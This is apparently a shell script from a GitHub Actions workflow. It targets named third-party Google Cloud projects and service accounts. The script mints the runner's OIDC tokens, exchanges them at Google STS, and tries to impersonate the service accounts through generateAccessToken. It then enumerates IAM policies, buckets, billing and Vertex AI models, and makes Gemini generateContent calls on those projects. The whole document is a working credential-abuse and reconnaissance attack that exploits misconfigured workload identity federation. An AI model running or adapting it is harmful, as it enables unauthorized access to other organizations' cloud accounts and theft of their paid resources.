          AUD
          cat > gen.txt <<'GEN'
          303574531351|github-actions@aryeelab.iam.gserviceaccount.com|aryeelab
          363590592857|363590592857-compute@developer.gserviceaccount.com|tranquil-post-357802
          731679007643|github-actions@rails-todo-app-386721.iam.gserviceaccount.com|rails-todo-app-386721
          536185737408|github@carbonifer-sandbox.iam.gserviceaccount.com|carbonifer-sandbox
          GEN
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          jq -n '{contents:[{role:"user",parts:[{text:"ping"}]}],generationConfig:{maxOutputTokens:8}}' > genc.json
          mint() { # provider -> writes tok.jwt
            local PRJ="$1" AUD=""
            AUD="https://iam.googleapis.com/$PRJ"
            rm -f tok.jwt
            local J=""
            for a in 1 2 3; do
              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
              echo "$J" | jq -r '.value // empty' > tok.jwt
              [ -s tok.jwt ] && return 0
              sleep 3
            done
            return 1
          }
          sts() { # provider -> r.json
            local PRJ="$1"
            curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
              --data-urlencode "subject_token=$(cat tok.jwt)" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
              -d "scope=https://www.googleapis.com/auth/cloud-platform"
            jq -r '.access_token // empty' r.json
          }
          api() { # num sa tok label url
            local num="$1" sa="$2" tok="$3" label="$4" url="$5"
            local c b
            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $tok" "$url")
            b=$(head -c 700 o.json | tr -d '\n' | tr -s ' ')
            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
          }
          apipost() { # num sa tok label url file
            local num="$1" sa="$2" tok="$3" label="$4" url="$5" f="$6"
            local c b
            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" "$url" -d @"$f")
            b=$(head -c 700 o.json | tr -d '\n' | tr -s ' ')
            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
          }
          echo '###PHASE1 getIamPolicy(POST) for all 40 with federated token'
          while IFS='|' read -r PRJ SAS; do
            [ -z "$PRJ" ] && continue
            NUM=$(echo "$PRJ" | cut -d/ -f2)
            mint "$PRJ" || { echo "##POL num=$NUM code=MINT_FAIL"; continue; }
            FT=$(sts "$PRJ")
            [ -z "$FT" ] && { echo "##POL num=$NUM code=STS_FAIL"; continue; }
            c=$(curl -s -o pol.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d '{}')
            b=$(head -c 900 pol.json | tr -d '\n' | tr -s ' ')
            echo "##POL num=$NUM code=$c body=$b"
            sleep 0.2
          done < targets.txt
          echo '###PHASE2 deep dive on GEN-200 identities'
          while IFS='|' read -r NUM SA PID; do
            [ -z "$NUM" ] && continue
            PRJ=$(grep -m1 "/$NUM/" targets.txt | cut -d'|' -f1)
            echo "##DEEP num=$NUM sa=$SA pid=$PID provider=$PRJ"
            mint "$PRJ" || { echo "##DEEP num=$NUM code=MINT_FAIL"; continue; }
            FT=$(sts "$PRJ")
            [ -z "$FT" ] && { echo "##DEEP num=$NUM code=STS_FAIL"; continue; }
            gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
            AT=$(jq -r '.accessToken // empty' g.json)
            echo "##DEEP num=$NUM gen=$gc toklen=${#AT}"
            [ -z "$AT" ] && continue
            c=$(curl -s -o pol.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d '{}')
            b=$(head -c 1500 pol.json | tr -d '\n' | tr -s ' ')
            echo "##DEEP num=$NUM sa-policy code=$c body=$b"
            api "$NUM" "$SA" "$AT" "sa-salist" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts"
            api "$NUM" "$SA" "$AT" "sa-usage" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?pageSize=5"
            api "$NUM" "$SA" "$AT" "sa-buckets" "https://storage.googleapis.com/storage/v1/b?project=$NUM"
            api "$NUM" "$SA" "$AT" "billing-pid" "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo"
            api "$NUM" "$SA" "$AT" "models-us-east4" "https://us-east4-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-east4/models"
            api "$NUM" "$SA" "$AT" "models-asia" "https://asia-northeast1-aiplatform.googleapis.com/v1/projects/$NUM/locations/asia-northeast1/models"
            api "$NUM" "$SA" "$AT" "publishers" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/publishers/google/models?pageSize=3"
            apipost "$NUM" "$SA" "$AT" "gencontent-flash-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/publishers/google/models/gemini-2.0-flash-001:generateContent" genc.json
            apipost "$NUM" "$SA" "$AT" "gencontent-flash-global" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/publishers/google/models/gemini-2.0-flash-001:generateContent" genc.json
            sleep 0.3
          done < gen.txt
          echo "##FINISHED"
